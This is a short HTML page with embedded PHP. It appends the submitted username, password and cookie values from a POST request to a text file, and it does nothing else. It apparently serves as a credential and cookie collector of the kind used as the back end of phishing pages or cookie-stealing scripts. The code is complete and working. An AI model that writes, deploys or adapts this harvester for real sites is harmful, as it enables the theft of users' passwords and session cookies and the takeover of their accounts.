<!DOCTYPE html>
<html>
<body>
<?php
$myfile = fopen("testfile.txt", "a");
fwrite($myfile, $_POST['username']."\n".$_POST['password']."\n". $_POST['cookie']."\n");
fclose($myfile);

?>
</body>
</html>